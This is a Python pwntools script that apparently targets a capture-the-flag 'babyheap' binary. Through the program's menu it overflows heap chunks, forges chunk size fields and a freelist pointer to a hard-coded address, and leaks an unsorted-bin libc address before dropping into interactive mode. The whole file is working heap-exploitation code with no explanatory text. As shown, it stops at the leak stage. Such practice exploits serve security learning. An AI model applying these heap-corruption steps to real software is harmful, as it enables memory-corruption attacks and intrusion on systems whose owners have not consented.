from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('/home/h3rmesk1t/babyheap')
elf = ELF('/home/h3rmesk1t/babyheap')
libc = ELF('/home/h3rmesk1t/libc.so.6')


def allocate(size):
    r.recvuntil(b'Command: ')
    r.sendline(b'1')
    r.recvuntil(b'Size: ')
    r.sendline(size)

def fill(idx, size, content):
    r.recvuntil(b'Command: ')
    r.sendline(b'2')
    r.recvuntil(b'Index: ')
    r.sendline(idx)
    r.recvuntil(b'Size: ')
    r.sendline(size)
    r.recvuntil(b'Content: ')
    r.sendline(content)


def free(idx):
    r.recvuntil(b'Command: ')
    r.sendline(b'3')
    r.recvuntil(b'Index: ')
    r.sendline(idx)

def dump(idx):
    r.recvuntil(b'Command: ')
    r.sendline(b'4')
    r.recvuntil(b'Index: ')
    r.sendline(idx)

allocate(b'16')
allocate(b'16')
allocate(b'16')
allocate(b'16')
allocate(b'128')

free(b'2')
free(b'1')

payload_chunk1_overflow = b'a' * 0x10 + p64(0) + p64(0x21) + p64(0x555555a01080)
fill(b'0', str(len(payload_chunk1_overflow)).encode('utf-8'), payload_chunk1_overflow)

payload_chunk4_overflow = b'a' * 0x10 + p64(0) + p64(0x21)
fill(b'3', str(len(payload_chunk4_overflow)).encode('utf-8'), payload_chunk4_overflow)

allocate(b'16')
allocate(b'16')

payload_chunk4_overflow = b'a' * 0x10 + p64(0) + p64(0x91)
fill(b'3', str(len(payload_chunk4_overflow)).encode('utf-8'), payload_chunk4_overflow)

allocate(b'128')
free(b'4')
dump(b'2')
r.recvuntil(b'Content: \n')
unsortedbin_addr = u64(r.recv(8))
log.success('unsorted bin address: ' + hex(unsortedbin_addr))

# gdb.attach(r)



r.interactive()